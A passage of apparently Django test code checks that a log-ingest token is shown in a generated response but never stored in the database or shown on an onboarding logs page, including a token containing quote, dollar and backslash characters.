        resp = self.generate(self.root)
        self.assertIn(LOG_TOKEN, resp.content.decode())
        self.assertEqual(db_hits(LOG_TOKEN), [])
        self.assertNotIn(LOG_TOKEN, self.c.get(reverse("onboarding:step", args=[self.run_.pk, "logs"])).content.decode())

    def test_a_token_with_quote_dollar_and_backslash_is_still_redacted_in_what_is_stored(self):
        hostile = 'needle"tok$en\\end-77'
        with override_settings(LOG_INGEST_TOKEN=hostile):
            resp = self.generate(self.root)
            self.assertEqual(resp.status_code, 200)
        self.t.refresh_from_db()
        stored = json.dumps(self.t.facts)
        self.assertNotIn("needle", stored)
        self.assertNotIn("tok$en", stored)
        self.assertNotIn("tok$$en", stored)
        self.assertEqual(db_hits("needle"), [])
